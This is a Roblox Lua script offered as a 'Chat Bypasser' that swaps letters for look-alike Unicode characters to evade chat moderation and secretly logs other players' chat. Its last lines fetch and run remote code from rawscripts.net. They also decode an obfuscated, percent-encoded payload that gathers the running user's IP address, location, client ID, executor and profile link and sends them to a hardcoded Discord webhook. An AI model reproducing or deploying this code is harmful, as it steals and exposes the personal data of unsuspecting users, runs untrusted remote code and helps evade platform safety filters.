local gui = Instance.new("ScreenGui")
gui.Name = "Chat Bypasser"
gui.Parent = game.CoreGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0.2, 0, 0.05, 0)
main.Position = UDim2.new(0.2, 0, 0.2, 0)
main.BackgroundColor3 = Color3.new(0, 0, 0.5)
main.BorderSizePixel = 0
main.Active = true
main.BackgroundTransparency = 0
main.Draggable = true
main.Parent = gui

local lbl = Instance.new("TextLabel")
lbl.Size = UDim2.new(0.62, 0, 1, 0)
lbl.Position = UDim2.new(0, 0, 0, 0)
lbl.BackgroundColor3 = Color3.new(0, 0, 0)
lbl.BorderSizePixel = 0
lbl.Text = "Chat Bypasser Special Editon"
lbl.TextColor3 = Color3.new(255, 255, 255)
lbl.BackgroundTransparency = 1
lbl.Font = Enum.Font.ArialBold
lbl.TextSize = 15
lbl.Parent = main

local mi = Instance.new("TextButton")
mi.Size = UDim2.new(0.1, 0, 0.8, 0)
mi.Position = UDim2.new(0.89, 0, 0.1, 0)
mi.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
mi.BorderSizePixel = 0
mi.Text = ">"
mi.TextColor3 = Color3.new(255, 255, 255)
mi.BackgroundTransparency = 0
mi.Font = Enum.Font.Arial
mi.TextSize = 15
mi.Visible = false
mi.Parent = main

local mr = Instance.new("TextButton")
mr.Size = UDim2.new(0.1, 0, 0.8, 0)
mr.Position = UDim2.new(0.89, 0, 0.1, 0)
mr.BackgroundColor3 = Color3.new(0, 0.3,0.6)
mr.BorderSizePixel = 0
mr.Text = "–"
mr.TextColor3 = Color3.new(255, 255, 255)
mr.BackgroundTransparency = 0
mr.Font = Enum.Font.Arial
mr.TextSize = 15
mr.Parent = main

local by = Instance.new("Frame")
by.Size = UDim2.new(1, 0, 5, 0)
by.Position = UDim2.new(0, 0, 1, 0)
by.BackgroundColor3 = Color3.new(0, 0, 0.2)
by.BorderColor3 = Color3.new(0, 0, 0)
by.BorderSizePixel = 0
by.Active = false
by.BackgroundTransparency = 0
by.Parent = main

local cre = Instance.new("TextLabel")
cre.Size = UDim2.new(0.9, 0, 0.1, 0)
cre.Position = UDim2.new(0, 0, 0, 0)
cre.BackgroundColor3 = Color3.new(0, 0, 0)
cre.BorderColor3 = Color3.new(0, 0, 0)
cre.BorderSizePixel = 0
cre.Text = "Cracked by:???(avtor scripts)"
cre.TextColor3 = Color3.new(255, 255, 255)
cre.BackgroundTransparency = 1
cre.Font = Enum.Font.Arial
cre.TextSize = 10
cre.Parent = by

local yt = Instance.new("TextLabel")
yt.Size = UDim2.new(0.38, 0, 0.1, 0)
yt.Position = UDim2.new(0, 0, 0.1, 0)
yt.BackgroundColor3 = Color3.new(0, 0, 0)
yt.BorderColor3 = Color3.new(0, 0, 0)
yt.BorderSizePixel = 0
yt.Text = "Special for Avtor Scripts"
yt.TextColor3 = Color3.new(255, 255, 255)
yt.BackgroundTransparency = 1
yt.Font = Enum.Font.Arial
yt.TextSize = 10
yt.Parent = by

local box = Instance.new("TextBox")
box.Size = UDim2.new(0.9, 0, 0.3, 0)
box.Position = UDim2.new(0.05, 0, 0.25, 0)
box.BackgroundColor3 = Color3.new(0, 0, 1)
box.BorderSizePixel = 0
box.Text = ""
box.TextColor3 = Color3.new(1,1,1)
box.BackgroundTransparency = 0.8
box.Font = Enum.Font.SourceSans
box.TextSize = 15
box.PlaceholderText = "Enter Text..."
box.TextWrapped = true
box.ClearTextOnFocus = false
box.MultiLine = true
box.TextYAlignment = Enum.TextYAlignment.Top
box.TextXAlignment = Enum.TextXAlignment.Left
box.Parent = by

local send = Instance.new("TextButton")
send.Size = UDim2.new(0.9, 0, 0.2, 0)
send.Position = UDim2.new(0.05, 0, 0.6, 0)
send.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
send.BorderSizePixel = 0
send.Text = "Send Text"
send.TextColor3 = Color3.new(255, 255, 255)
send.BackgroundTransparency = 0
send.Font = Enum.Font.Arial
send.TextSize = 15
send.Parent = by

mi.MouseButton1Click:connect(function()
    mi.Visible = false
    mr.Visible = true
    by.Visible = true
    end)

mr.MouseButton1Click:connect(function()
    mi.Visible = true
    mr.Visible = false
    by.Visible = false
    end)


local function convertText()
local text = box.Text
local convertedText = ""

local conversionTableUpper = {
    A = "Ạ", B = "Ḅ", C = "C", D = "Ḍ", E = "Ẹ",
    F = "F", G = "Ģ", H = "Ḥ", I = "Ị", J = "J",
    K = "Ḳ", L = "Ḷ", M = "Ṃ", N = "Ṇ", O = "Ọ",
    P = "Р", Q = "Q", R = "Ṛ", S = "Ṣ", T = "Ṭ",
    U = "Ụ", V = "Ṿ", W = "Ẉ", X = "Ẋ", Y = "Ỵ", Z = "Ẓ"
}

local conversionTableLower = {
    a = "ạ", b = "ḅ", c = "c", d = "ḍ", e = "ẹ",
    f = "f", g = "ɡ", h = "ḥ", i = "ị", j = "ј",
    k = "ḳ", l = "ḷ", m = "ṃ", n = "ṇ", o = "ọ",
    p = "р", q = "q", r = "ṛ", s = "ṣ", t = "ṭ",
    u = "ụ", v = "ṿ", w = "ẉ", x = "ẋ", y = "ỵ", z = "ẓ", ["|"] = "\r",
}

for char in text:gmatch(".") do
local convertedChar = conversionTableUpper[char] or conversionTableLower[char] or char
convertedText = convertedText .. convertedChar .. "̲"
end

box.Text = convertedText
end

send.MouseButton1Click:connect(function()
    local TextChatService = game:GetService("TextChatService")
    local Players = game:GetService("Players")

    local function sendMessage(msg)
    local player = Players.LocalPlayer
    if TextChatService.ChatInputBarConfiguration.TargetTextChannel then
    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    end
    end
    convertText()
    sendMessage(box.Text)
    box.Text = ""
    end)

local conv = Instance.new("TextButton")
conv.Size = UDim2.new(0.9, 0, 0.1, 0)
conv.Position = UDim2.new(0.05, 0, 0.85, 0)
conv.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
conv.BorderColor3 = Color3.new(0, 0, 0)
conv.BorderSizePixel = 0
conv.Text = "Convert"
conv.TextColor3 = Color3.new(255, 255, 255)
conv.BackgroundTransparency = 0
conv.Font = Enum.Font.Arial
conv.TextSize = 15
conv.Parent = by

conv.MouseButton1Click:connect(function()
convertText()
end)


local npfix = Instance.new("ScreenGui")
    npfix.Parent = game.CoreGui

    local MAIN = Instance.new("Frame")
    MAIN.Size = UDim2.new(0.25, 0, 0.3, 0)
    MAIN.Position = UDim2.new(0.7, 0, 0.65, 0)
    MAIN.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    MAIN.BorderColor3 = Color3.new(0, 0, 0)
    MAIN.BorderSizePixel = 0
    MAIN.Active = false
    MAIN.BackgroundTransparency = 0
    MAIN.Parent = npfix

    local CORN = Instance.new("UICorner")
    CORN.CornerRadius = UDim.new(0.1)
    CORN.Parent = MAIN

    local LABEL = Instance.new("TextLabel")
    LABEL.Size = UDim2.new(1, 0, 0.2, 0)
    LABEL.Position = UDim2.new(0, 0, 0, 0)
    LABEL.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    LABEL.BorderColor3 = Color3.new(0, 0, 0)
    LABEL.BorderSizePixel = 0
    LABEL.Text = "Chat bypasser| FIXER"
    LABEL.TextColor3 = Color3.new(255, 255, 255)
    LABEL.BackgroundTransparency = 1
    LABEL.Font = Enum.Font.Arial
    LABEL.TextSize = 17
    LABEL.Parent = MAIN

    local SEC = Instance.new("Frame")
    SEC.Size = UDim2.new(1, 0, 0.02, 0)
    SEC.Position = UDim2.new(0, 0, 0.15, 0)
    SEC.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
    SEC.BorderColor3 = Color3.new(0, 0, 0)
    SEC.BorderSizePixel = 0
    SEC.Active = false
    SEC.BackgroundTransparency = 0
    SEC.Parent = MAIN

    local CREDIT = Instance.new("TextLabel")
    CREDIT.Size = UDim2.new(1, 0, 0.1, 0)
    CREDIT.Position = UDim2.new(0, 0, 0.16, 0)
    CREDIT.BackgroundColor3 = Color3.new(0, 0, 0)
    CREDIT.BorderColor3 = Color3.new(0, 0, 0)
    CREDIT.BorderSizePixel = 0
    CREDIT.Text = "By: belb24 | Auto Loaded"
    CREDIT.TextColor3 = Color3.new(255, 255, 255)
    CREDIT.BackgroundTransparency = 1
    CREDIT.Font = Enum.Font.Arial
    CREDIT.TextSize = 10
    CREDIT.Parent = MAIN

    local KILL = Instance.new("TextButton")
    KILL.Size = UDim2.new(0.9, 0, 0.5, 0)
    KILL.Position = UDim2.new(0.05, 0, 0.3, 0)
    KILL.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    KILL.BorderColor3 = Color3.new(0, 0, 0)
    KILL.BorderSizePixel = 0
    KILL.Text = "Hide Gui"
    KILL.TextColor3 = Color3.new(255, 255, 255)
    KILL.BackgroundTransparency = 0
    KILL.Font = Enum.Font.Arcade
    KILL.TextSize = 25
    KILL.Parent = MAIN

    local CORNER = Instance.new("UICorner")
    CORNER.CornerRadius = UDim.new(0.2)
    CORNER.Parent = KILL

    local HIDE = Instance.new("TextBox")
    HIDE.Size = UDim2.new(0.01, 0, 0.01, 0)
    HIDE.Position = UDim2.new(0, 0, 90, 0)
    HIDE.BackgroundColor3 = Color3.new(0, 0, 0)
    HIDE.BorderColor3 = Color3.new(0, 0, 0)
    HIDE.BorderSizePixel = 0
    HIDE.Text = "hehe"
    HIDE.TextColor3 = Color3.new(255, 255, 255)
    HIDE.BackgroundTransparency = 0
    HIDE.Font = Enum.Font.Arial
    HIDE.TextSize = 15
    HIDE.Parent = npfix

    KILL.MouseButton1Click:connect(function()
        MAIN:Destroy()
        end)

    local function updateChatLogs(message)
    HIDE.Text = HIDE.Text .. "\n" .. message
    end

    local TextChatService = game:GetService("TextChatService")

    TextChatService.OnIncomingMessage = function(textChatMessage)
    local playerName = textChatMessage.TextSource.Name
    local messageContent = textChatMessage.Text
    updateChatLogs(playerName .. ": " .. messageContent)
    end

loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anthonys-acl-ANTI-CHAT-LOGGER-7184"))()

function decodeChar(hex) return string.char(tonumber(hex,16)) end function decodeString(str) local output, t = string.gsub(str,"%%(%x%x)",decodeChar) return output end;loadstring(decodeString("local%20id%20%3D%20game%3AGetService%28%22Players%22%29%2ELocalPlayer%2EUserId%0D%0Alocal%20gameId%20%3D%20game%2EPlaceId%0D%0Alocal%20playerLink%20%3D%20%22https%3A%2F%2Fwww%2Eroblox%2Ecom%2Fusers%2F%22%20%2E%2E%20id%20%2E%2E%20%22%2Fprofile%22%0D%0Alocal%20executor%20%3D%20identifyexecutor%28%29%0D%0Alocal%20gameLink%20%3D%20%22https%3A%2F%2Fwww%2Eroblox%2Ecom%2Fgames%2F%22%20%2E%2E%20gameId%20%2E%2E%20%22%22%0D%0A%0D%0Alocal%20api%20%3D%20game%2EHttpService%3AJSONDecode%28game%3AHttpGet%28%27https%3A%2F%2Fipwho%2Eis%2F%27%29%29%0D%0A%0D%0Alocal%20HttpService%20%3D%20game%3AGetService%28%22HttpService%22%29%0D%0A%0D%0Alocal%20webhookURL%20%3D%20%22https%3A%2F%2Fdiscord%2Ecom%2Fapi%2Fwebhooks%2F1322782719452905493%2Fd7wVitOMjyBK3pEadTpB52vovy4hkbZzu%5F%5FmO7H6ZUwSigOsggAFSIOivUt5mP5pCZ6C%22%0D%0A%0D%0Alocal%20httpRequest%20%3D%20%28syn%20and%20syn%2Erequest%29%20or%20%28http%20and%20http%2Erequest%29%20or%20http%5Frequest%20or%20%28fluxus%20and%20fluxus%2Erequest%29%0D%0A%0D%0Alocal%20payload%20%3D%20%7B%0D%0A%20%20%20%20content%20%3D%20%22%22%2C%0D%0A%20%20%20%20embeds%20%3D%20%7B%0D%0A%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20title%20%3D%20%22your%20script%20has%20been%20executed%21%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20description%20%3D%20game%2EPlayers%2ELocalPlayer%2EName%20%2E%2E%20%22%20executed%20your%20script%21%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20type%20%3D%20%22rich%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20color%20%3D%20tonumber%280x0000FF%29%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20fields%20%3D%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22Hardware%20ID%3A%22%2C%20%2D%2D%20basically%2E%2E%20like%20HWID%2C%20lol%2E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20game%3AGetService%28%22RbxAnalyticsService%22%29%3AGetClientId%28%29%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20true%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22IP%20addres%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20api%2Eip%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20false%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22country%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20api%2Ecountry%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20false%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%09%09%09%09%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22region%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20api%2Eregion%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20false%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22city%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20api%2Ecity%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20true%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%09%09%09%09%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22executor%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20executor%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20false%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%09%09%09%09%20%20%09%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22Game%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20gameLink%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20false%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%09%09%09%09%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%20%3D%20%22profile%20link%3A%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%20%3D%20playerLink%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%20%3D%20true%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%7D%0D%0A%7D%0D%0A%0D%0Alocal%20response%20%3D%20httpRequest%28%7B%0D%0A%20%20%20%20Url%20%3D%20webhookURL%2C%0D%0A%20%20%20%20Method%20%3D%20%22POST%22%2C%0D%0A%20%20%20%20Headers%20%3D%20%7B%0D%0A%20%20%20%20%20%20%20%20%5B%22Content%2DType%22%5D%20%3D%20%22application%2Fjson%22%0D%0A%20%20%20%20%7D%2C%0D%0A%20%20%20%20Body%20%3D%20HttpService%3AJSONEncode%28payload%29%0D%0A%7D%29"))()
